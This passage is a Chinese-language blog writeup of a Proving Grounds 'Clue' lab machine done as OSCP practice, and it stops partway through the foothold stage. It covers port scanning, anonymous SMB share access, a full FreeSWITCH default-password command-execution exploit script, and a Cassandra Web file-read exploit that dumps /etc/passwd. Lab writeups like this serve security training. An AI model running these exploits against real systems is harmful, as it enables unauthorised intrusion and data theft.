@@ -1,0 +1,1080 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" Difficulty: Hard Community Rate: Very Hard OS: Linux Nmap Results Not shown: 65529 filtered tcp ports (no-response) PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I2r | 256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA= | 256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+ 80/tcp open http syn-ack ttl 61 Apache httpd 2.4.38 |_http-title: 403 Forbidden | http-methods: |_ Supported Methods: OPTIONS HEAD GET POST |_http-server-header: Apache/2.4.38 (Debian) 139/tcp open netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn syn-ack ttl 61 Samba smbd 4.9.5-Debian (workgroup: WORKGROUP) 3000/tcp open http syn-ack ttl 61 Thin httpd |_http-title: Cassandra Web |_http-server-header: thin |_http-favicon: Unknown favicon MD5: 68089FD7828CD453456756FE6E7C4FD8 | http-methods: |_ Supported Methods: GET HEAD 8021/tcp open freeswitch-event syn-ack ttl 61 FreeSWITCH mod_event_socket Enumeration 两个HTTP服务端口，先看80：\n">
+<title>OSCP-PGP Clue Writeup</title>
+
+<link rel='canonical' href='http://localhost:1313/oscp-pgp-clue-writeup/'>
+
+<link rel="stylesheet" href="/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css"><meta property='og:title' content="OSCP-PGP Clue Writeup">
+<meta property='og:description' content=" Difficulty: Hard Community Rate: Very Hard OS: Linux Nmap Results Not shown: 65529 filtered tcp ports (no-response) PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I2r | 256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA= | 256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+ 80/tcp open http syn-ack ttl 61 Apache httpd 2.4.38 |_http-title: 403 Forbidden | http-methods: |_ Supported Methods: OPTIONS HEAD GET POST |_http-server-header: Apache/2.4.38 (Debian) 139/tcp open netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn syn-ack ttl 61 Samba smbd 4.9.5-Debian (workgroup: WORKGROUP) 3000/tcp open http syn-ack ttl 61 Thin httpd |_http-title: Cassandra Web |_http-server-header: thin |_http-favicon: Unknown favicon MD5: 68089FD7828CD453456756FE6E7C4FD8 | http-methods: |_ Supported Methods: GET HEAD 8021/tcp open freeswitch-event syn-ack ttl 61 FreeSWITCH mod_event_socket Enumeration 两个HTTP服务端口，先看80：\n">
+<meta property='og:url' content='http://localhost:1313/oscp-pgp-clue-writeup/'>
+<meta property='og:site_name' content='JoWhite'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-04-25T14:19:39&#43;00:00'/><meta property='article:modified_time' content='2025-04-25T14:19:39&#43;00:00'/>
+<meta name="twitter:title" content="OSCP-PGP Clue Writeup">
+<meta name="twitter:description" content=" Difficulty: Hard Community Rate: Very Hard OS: Linux Nmap Results Not shown: 65529 filtered tcp ports (no-response) PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I2r | 256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA= | 256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+ 80/tcp open http syn-ack ttl 61 Apache httpd 2.4.38 |_http-title: 403 Forbidden | http-methods: |_ Supported Methods: OPTIONS HEAD GET POST |_http-server-header: Apache/2.4.38 (Debian) 139/tcp open netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn syn-ack ttl 61 Samba smbd 4.9.5-Debian (workgroup: WORKGROUP) 3000/tcp open http syn-ack ttl 61 Thin httpd |_http-title: Cassandra Web |_http-server-header: thin |_http-favicon: Unknown favicon MD5: 68089FD7828CD453456756FE6E7C4FD8 | http-methods: |_ Supported Methods: GET HEAD 8021/tcp open freeswitch-event syn-ack ttl 61 FreeSWITCH mod_event_socket Enumeration 两个HTTP服务端口，先看80：\n">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/en/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_8394d4d868d05114.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">😀</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/en">JoWhite</a></h1>
+            <h2 class="site-description">OraOra!</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/en/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/en/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/en/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/en/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/en/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="http://localhost:1313/" >中文</option>
+                                
+                                    <option value="http://localhost:1313/en/" selected>English</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#nmap-results">Nmap Results</a></li>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#initial-foothold">Initial Foothold</a></li>
+    <li><a href="#root">Root</a></li>
+    <li><a href="#what-i-have-learned">What I have learned</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/en/categories/oscp-pgp/" >
+                OSCP-PGP Writeups
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/oscp-pgp-clue-writeup/">OSCP-PGP Clue Writeup</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Apr 25, 2025</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+        <footer class="article-translations">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+            <div>
+                
+                    <a href="http://localhost:1313/oscp-pgp-clue-writeup/" class="link">中文</a>
+                
+            </div>
+        </footer>
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <ul class="wp-block-list">
+  <li>
+    Difficulty: Hard
+  </li>
+  <li>
+    Community Rate: Very Hard
+  </li>
+  <li>
+    OS: Linux
+  </li>
+</ul>
+<h2 id="nmap-results">Nmap Results
+</h2><div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+Not shown: 65529 filtered tcp ports (no-response)
+PORT     STATE SERVICE          REASON         VERSION
+22/tcp   open  ssh              syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I2r
+|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA=
+|   256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+
+80/tcp   open  http             syn-ack ttl 61 Apache httpd 2.4.38
+|_http-title: 403 Forbidden
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET POST
+|_http-server-header: Apache/2.4.38 (Debian)
+139/tcp  open  netbios-ssn      syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn      syn-ack ttl 61 Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
+3000/tcp open  http             syn-ack ttl 61 Thin httpd
+|_http-title: Cassandra Web
+|_http-server-header: thin
+|_http-favicon: Unknown favicon MD5: 68089FD7828CD453456756FE6E7C4FD8
+| http-methods: 
+|_  Supported Methods: GET HEAD
+8021/tcp open  freeswitch-event syn-ack ttl 61 FreeSWITCH mod_event_socket
+</pre>
+</div>
+<h2 id="enumeration">Enumeration
+</h2><p>两个HTTP服务端口，先看80：<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="729" height="356" src="../legacy/uploads/2025/04/1745587019-image.png" alt="" class="wp-image-1342" srcset="../legacy/uploads/2025/04/1745587019-image.png 729w, ../legacy/uploads/2025/04/1745587019-image-300x147.png 300w" sizes="auto, (max-width: 729px) 100vw, 729px" /> </figure></p>
+<p>直接就是无权访问，用ffuf尝试遍历：</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: plain; title: ; notranslate" title="">
+ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://192.168.170.240/FUZZ -fw 770 
+<p>backup                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 193ms]
+</pre></p>
+</div>
+<p>找到一个文件夹backup，访问一下也是403 forbidden。端口3000下好像是一个数据库的页面服务：<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="570" src="../legacy/uploads/2025/04/1745587152-image-1024x570.png" alt="" class="wp-image-1344" srcset="../legacy/uploads/2025/04/1745587152-image-1024x570.png 1024w, ../legacy/uploads/2025/04/1745587152-image-300x167.png 300w, ../legacy/uploads/2025/04/1745587152-image-768x428.png 768w, ../legacy/uploads/2025/04/1745587152-image-1536x855.png 1536w, ../legacy/uploads/2025/04/1745587152-image.png 1871w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>谷歌搜了一下发现了这个文章 <a href="https://jfrog.com/blog/cve-2021-44521-exploiting-apache-cassandra-user-defined-functions-for-remote-code-execution/" target="_blank"  rel="nofollow" >CVE-2021-44521</a>, 以及一个github的<a href="https://github.com/WoodenKlaas/CVE-2021-44521" target="_blank"  rel="nofollow" >POC</a>. 手动尝试文章描述的方法，但会提示用户无权限. <figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="581" src="../legacy/uploads/2025/04/1745587418-image-1024x581.png" alt="" class="wp-image-1347" srcset="../legacy/uploads/2025/04/1745587418-image-1024x581.png 1024w, ../legacy/uploads/2025/04/1745587418-image-300x170.png 300w, ../legacy/uploads/2025/04/1745587418-image-768x436.png 768w, ../legacy/uploads/2025/04/1745587418-image.png 1168w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>（这里截不到显示的信息，总之就是登录的用户cassie无权限</p>
+<p>靶机还开放了SMB服务，用enum4linux扫描一下：</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+ enum4linux 192.168.x.240
+...
+Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        backup          Disk      Backup web directory shares
+        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
+....
+</pre>
+</div>
+<p>smb服务允许匿名登录，并发现了一个share <strong>backup</strong>. 登录并查看：</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+smbclient //192.168.170.240/backup
+Password for &#x5B;WORKGROUP\kali]:
+Try "help" to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Fri Aug  5 18:43:50 2022
+  ..                                  D        0  Fri Aug  5 18:43:44 2022
+  freeswitch                          D        0  Fri Aug  5 18:43:51 2022
+  cassandra                           D        0  Sat May  7 01:04:47 2022
+<p></pre></p>
+</div>
+<p>发现了两个文件夹，下载下来查看:</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+smb: \&gt; recurse ON
+smb: \&gt; prompt OFF
+smb: \&gt; mget *
+......
+</pre>
+</div>
+<p>手动看了一下，应该是安装的两个软件的备份文件？因为3000端口上运行着cassandra， 8021端口上运行着freeswitch. 在下载下来的文件里发现了freeswitch版本为1.2.7：<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="947" height="609" src="../legacy/uploads/2025/04/1745588029-image.png" alt="" class="wp-image-1352" srcset="../legacy/uploads/2025/04/1745588029-image.png 947w, ../legacy/uploads/2025/04/1745588029-image-300x193.png 300w, ../legacy/uploads/2025/04/1745588029-image-768x494.png 768w" sizes="auto, (max-width: 947px) 100vw, 947px" /> </figure></p>
+<h2 id="initial-foothold">Initial Foothold
+</h2><p>用searchsploit搜一下看有没有对应的exploit:<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="842" height="238" src="../legacy/uploads/2025/04/1745588083-image.png" alt="" class="wp-image-1355" srcset="../legacy/uploads/2025/04/1745588083-image.png 842w, ../legacy/uploads/2025/04/1745588083-image-300x85.png 300w, ../legacy/uploads/2025/04/1745588083-image-768x217.png 768w" sizes="auto, (max-width: 842px) 100vw, 842px" /> </figure></p>
+<p>找到了一个1.10.1版本的RCE，复制下来并查看：</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: python; title: ; notranslate" title="">
+#!/usr/bin/python3
+<p>from socket import *
+import sys</p>
+<p>if len(sys.argv) != 3:
+print('Missing arguments')
+print('Usage: freeswitch-exploit.py &lt;target&gt; &lt;cmd&gt;')
+sys.exit(1)</p>
+<p>ADDRESS=sys.argv[1]
+CMD=sys.argv[2]
+PASSWORD='ClueCon' # default password for FreeSWITCH</p>
+<p>s=socket(AF_INET, SOCK_STREAM)
+s.connect((ADDRESS, 8021))</p>
+<p>response = s.recv(1024)
+if b'auth/request' in response:
+s.send(bytes(f'auth {PASSWORD}\n\n', 'utf8'))
+response = s.recv(1024)
+print(response)
+if b'+OK accepted' in response:
+print('Authenticated')
+s.send(bytes('api system {}\n\n'.format(CMD), 'utf8'))
+response = s.recv(8096).decode()
+print(response)
+else:
+print('Authentication failed')
+sys.exit(1)
+else:
+print('Not prompted for authentication, likely not vulnerable')
+sys.exit(1)
+</pre></p>
+</div>
+<p>这个script用默认密码ClueCon来验证后，再尝试执行命令。直接运行一下试试：</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+python3 47799.py 192.168.170.240 &#039;whoami&#039;
+b&#039;Content-Type: command/reply\nReply-Text: -ERR invalid\n\n&#039;
+Authentication failed
+</pre>
+</div>
+<p>显示验证失败，应该是密码被改了。看下cassandra有没有exploit:<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="847" height="181" src="../legacy/uploads/2025/04/1745588291-image.png" alt="" class="wp-image-1359" srcset="../legacy/uploads/2025/04/1745588291-image.png 847w, ../legacy/uploads/2025/04/1745588291-image-300x64.png 300w, ../legacy/uploads/2025/04/1745588291-image-768x164.png 768w" sizes="auto, (max-width: 847px) 100vw, 847px" /> </figure></p>
+<p>有一个Remote File Read的exploit，复制下来试一下：</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+python3 49362.py -p 3000 192.168.170.240 &#039;/etc/passwd&#039;
+<p>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
